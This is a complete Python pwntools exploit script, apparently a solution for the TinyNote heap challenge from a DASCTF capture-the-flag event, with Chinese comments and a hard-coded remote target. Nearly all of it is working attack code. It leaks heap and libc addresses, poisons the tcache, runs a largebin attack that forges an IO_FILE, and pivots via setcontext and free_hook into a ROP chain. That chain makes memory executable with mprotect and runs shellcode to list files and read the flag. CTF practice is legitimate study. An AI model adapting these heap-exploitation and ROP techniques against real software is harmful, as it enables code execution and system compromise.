#encoding:utf-8
from pwn import *
import re

ip = '82.157.6.175'
port = 24200 
local = 0
filename = './TinyNote'
libc_name = 'libc.so.6'
PREV_INUSE = 0x1
IS_MMAPPED = 0x2
NON_MAIN_ARENA = 0x4

def create_connect():
	global io, elf, libc, libc_name

	elf = ELF(filename)
	context(os=elf.os, arch=elf.arch)
	
	if local:
		io = process(filename)
		if elf.arch == 'amd64':
			libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
		elif elf.arch == 'i386':
			libc_name = '/lib/i386-linux-gnu/libc.so.6'
	else:
		io = remote(ip, port)
	try:
		libc_name = 'libc-2.33.so'
		libc = ELF(libc_name)
	except:
		pass

cc = lambda : create_connect()
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
g = lambda x: gdb.attach(io, x)

r = lambda : io.recv(timeout=1)
rr = lambda x: io.recv(x, timeout=1)
rl = lambda : io.recvline(keepends=False)
ru = lambda x : io.recvuntil(x)
ra = lambda : io.recvall(timeout=1)
it = lambda : io.interactive()
cl = lambda : io.close()

def regexp_out(data):
    patterns = [
        re.compile(r'(flag{.*?})'),
        re.compile(r'xnuca{(.*?)}'),
        re.compile(r'DASCTF{(.*?)}'),
        re.compile(r'WMCTF{.*?}'),
        re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),
    ]

    for pattern in patterns:
        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)
        if len(res) > 0:
            return str(res[0])

    return None

def add(idx):
	sa(b'Choice:', b'1')
	sa(b'Index:', str(idx).encode())


def edit(idx, content):
	sa(b'Choice:', b'2')
	sa(b'Index:', str(idx).encode())
	sa(b'Content:', content.encode() if isinstance(content, str) else content)

def show(idx):
	sa(b'Choice:', b'3')
	sa(b'Index:', str(idx).encode())
	ru(b'Content:')

def delete(idx):
	sa(b'Choice:', b'4')
	sa(b'Index:', str(idx).encode())

def mchunk_size(size):
	return p64(0) + p64(size)

def pwn():
	cc()

	add(0)
	add(1)
	delete(0)
	show(0)
	heap_addr = u64(rr(5).ljust(0x8, b'\x00')) << 12
	log.success('heap_addr: 0x%x', heap_addr)
	
	# 提前记录好 _IO_buf_base 和 _IO_buf_end 的相关参数
	length = 0x240
	start = heap_addr + 0x240 
	end = start + ((length) - 100)//2
	
	delete(1)
	poc = ((heap_addr+0x2c0) >> 12) ^(heap_addr+0x50)
	edit(1, p64(poc))
	add(0)
	add(1)
	# 修改 0x240 的 tcache 数量，并构造好首部
	edit(1, p8(8)*8 + p64(0x241))
	delete(0)

	add(0)
	add(1)
	delete(0)
	delete(1)
	# 将 fd 指向刚刚构造好的 0x240 chunk
	poc = ((heap_addr+0x2e0)>>12) ^ (heap_addr+0x60)
	edit(1, p64(poc))
	add(1)
	add(0) # unsorted_chunk: heap+0x10
	log.success('unsorted_chunk: 0x%x', heap_addr+0x60)
	delete(1)

	add(1)
	edit(1, mchunk_size(0x21))
	add(1)
	edit(1, mchunk_size(0x451))
	for i in range(0x22):
		add(1)

	add(1)
	add(2)
	delete(1)
	delete(2)
	poc = ((heap_addr+0x780)>>12) ^ (heap_addr+0x310)
	edit(2, p64(poc))
	add(2)
	# 获得第一块 largebin_chunk，地址为 heap+0x300
	add(1) 
	log.success('large chunk No.1: 0x%x', heap_addr+0x300)
	delete(2)

	add(2)
	edit(2, mchunk_size(0x21))
	add(2)
	edit(2, mchunk_size(0x441))
	add(2)
	add(2)
	# 这里提前将 _IO_buf_end 的值填上
	edit(2, p64(end))
	for i in range(0x1f):
		add(2)
	add(2)
	edit(2, mchunk_size(0x31))
	add(2)
	
	delete(0)
	show(0)
	libc.address = u64(rr(8)) - 0x1e0c00
	log.success('libc_addr: 0x%x', libc.address)
	_IO_list_all = libc.sym['_IO_list_all']
	_IO_str_jumps = libc.address + 0x1e2560
	free_hook = libc.address + 0x1e3e20
	_IO_str_overflow = libc.address + 0x8fbb0
	setcontext = libc.address + 0x529ad
	# 0x000000000014a0a0 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
	hijack_rsp = libc.address + 0x14a0a0
	# 0x0000000000028a55 : pop rdi ; ret
	pop_rdi = libc.address + 0x28a55
	# 0x000000000002a4cf : pop rsi ; ret
	pop_rsi = libc.address + 0x2a4cf
	# 0x00000000000c7f32 : pop rdx ; ret
	pop_rdx = libc.address + 0xc7f32
	# 0x0000000000044c70 : pop rax ; ret
	pop_rax = libc.address + 0x44c70
	# 0x000000000006105a: syscall; ret;
	syscall = libc.address + 0x6105a
	# 0x59020 : mov rsp, rdx ; ret
	mov_rdx_rsp = libc.address + 0x59020
	# 0x0000000000033af2 : pop rsp ; ret
	pop_rsp = libc.address + 0x33af2
	ret = libc.address + 0x26699

	mprotect = libc.sym['mprotect']
	new_stack = libc.bss()
	read_buf = libc.bss() + 0x200


	add(0)
	delete(0)
	delete(2)
	# heap_addr + 0x60 对应 [rdx + 0x20] 的位置，放置 setcontext+61 的地址
	edit(0, p64(setcontext))
	poc = ((heap_addr+0xc00)>>12)^((heap_addr+0x7b0))
	edit(2, p64(poc))
	add(0)
	# 获得第二块 largebin_chunk，地址为 heap+0x300
	add(2)
	log.success('large chunk No.2: 0x%x', heap_addr+0x7a0)
	delete(0)

	delete(1)

	add(0)
	# 第一个 large chunk 入链
	add(1)
	delete(0)
	delete(1)
	poc = ((heap_addr+0x80)>>12)^((heap_addr+0x320))
	edit(1, p64(poc))
	add(0)
	add(1)
	target = _IO_list_all - 0x20
	# 布置好 Poc
	edit(1, p64(heap_addr+0x300)+p64(target))
	delete(0)
	delete(2)

	add(0)

	# 第二个 large chunk 入链，写入 _IO_list_all
	add(0)
	edit(1, p64(heap_addr+0x300)+p64(heap_addr+0x300))
	edit(2, p64(0)+p64(0))


	add(0)
	add(1)
	delete(1)
	# heap_addr + 0xe0 -----> mov rsp, [rdx + 0xa0]
	# heap_addr + 0xe8 -----> mov rcx, [rdx + 0xa8]; push rcx
	# 这里我们就可以放入第一条 ROP 指令
	edit(1, p64(heap_addr+0x1c0)+p64(pop_rdi))
	delete(0)
	poc = ((heap_addr+0xe0)>>12) ^ (heap_addr+0x870)
	edit(0, p64(poc))
	add(0)
	add(1)
	# 修改 FAKE IO_FILE 的 vtable 为 _IO_str_jumps
	edit(1, p64(0)+p64(_IO_str_jumps))
	delete(0)

	add(0)
	add(1)
	delete(0)
	delete(1)
	poc = ((heap_addr+0x100)>>12) ^ (heap_addr+0x7d0)
	edit(1, p64(poc))
	add(0)
	add(1)
	# 填充 FAKE IO_FILE，写入 _IO_buf_base
	edit(1, p64(0) + p64(start))
	delete(0)

	add(0)
	add(1)
	delete(0)
	delete(1)
	poc = ((heap_addr+0x120)>>12) ^ (heap_addr+0x7f0)
	edit(1, p64(poc))
	add(0)
	add(1)
	# 填充 FAKE IO_FILE
	edit(1, p64(0) + p64(0))
	delete(0)

	add(0)
	add(1)
	delete(0)
	delete(1)
	poc = ((heap_addr+0x140)>>12) ^ (heap_addr+0x810)
	edit(1, p64(poc))
	add(0)
	add(1)
	# 填充 FAKE IO_FILE
	edit(1, p64(0) + p64(0))
	delete(0)

	add(0)
	add(1)
	delete(0)
	delete(1)
	poc = ((heap_addr+0x160)>>12) ^ (heap_addr+0x830)
	edit(1, p64(poc))
	add(0)
	add(1)
	# 填充 FAKE IO_FILE
	edit(1, p64(0) + p64(0))
	delete(0)

	add(0)
	add(1)
	delete(0)
	delete(1)
	poc = ((heap_addr+0x180)>>12) ^ (heap_addr+0x850)
	edit(1, p64(poc))
	add(0)
	add(1)
	edit(1, p64(0) + p64(0))
	delete(0)
	add(2)
	add(2)
	edit(2, p64(0)+p64(free_hook))

	# heap_addr + 0x1c0
	add(0)
	add(1)
	delete(0)

	# heap_addr + 0x1c0: 0, pop rsi
	edit(0, p64(0)+p64(pop_rsi)) 
	delete(1)
	poc = ((heap_addr+0x1e0)>>12) ^ (heap_addr+0x1d0)
	edit(1, p64(poc))
	add(0)
	# heap_addr + 0x1e0: 0x100, &read
	edit(0, p64(0x100)+p64(libc.sym['read'])) 
	add(1)
	# heap_addr + 0x1d0: new_stack, pop rdx
	edit(1, p64(new_stack)+p64(pop_rdx)) 

	add(0)
	add(1)
	delete(0)
	delete(1)
	poc = ((heap_addr+0x220)>>12) ^ (heap_addr+0x1f0)
	edit(1, p64(poc))
	add(1)
	add(2)
	# heap_addr + 0x1f0: pop rsp, &new_stack
	edit(2, p64(pop_rsp)+p64(new_stack))
	edit(1, p64(new_stack))

	add(0) # heap_addr + 0x240
	edit(0, p64(hijack_rsp)+p64(heap_addr+0x40)) 
	# 第一个对应的就是拷贝到 free_hook 的 gadget 地址，执行 gadget
	# 第二个对应的就是 mov rdx, qword ptr [rdi+8]
	
	add(1)
	add(2)
	delete(1)
	delete(2)
	poc = ((heap_addr+0x280)>>12) ^ (free_hook)
	edit(2, p64(poc))
	add(1)

	add(2)

	filename_addr = new_stack + 0x8 * 27
	# 第一段 ROP：执行 mprotect，将 heap 内存区域变成 RWX
	poc = b''
	poc += p64(pop_rdi)
	poc += p64(heap_addr)
	poc += p64(pop_rsi)
	poc += p64(0x4000)
	poc += p64(pop_rdx)
	poc += p64(7)
	poc += p64(libc.sym['mprotect'])

	# 第二段 ROP：将 shellcode 写入 heap 并跳转执行
	poc += p64(pop_rdi)
	poc += p64(0)
	poc += p64(pop_rsi)
	poc += p64(heap_addr)
	poc += p64(pop_rdx)
	poc += p64(0x100)
	poc += p64(libc.sym['read'])
	poc += p64(heap_addr)
	s(poc)
	
	# 获取 flag 文件名
	shellcode = b''
	shellcode += asm(shellcraft.open('./'))
	shellcode += asm(shellcraft.getdents64(3, read_buf, 0x400))
	shellcode += asm(shellcraft.write(1,read_buf, 0x400))
	shellcode += asm('''
		mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
		''' % (heap_addr+0x100))

	s(shellcode)
	if local:
		r()
		filename = '/flag'
	else:
		ru(b'haha_')
		filename = 'haha_'+rr(10).decode()
		r()
		r()

	# 获取 flag
	shellcode = asm(shellcraft.cat(filename))
	s(shellcode)
	log.success('flag: %s', ru(b'}').decode())
	# DASCTF{9d0e060bc2becb1514235e96fd121161}
	cl()
	
if __name__ == '__main__':
	pwn()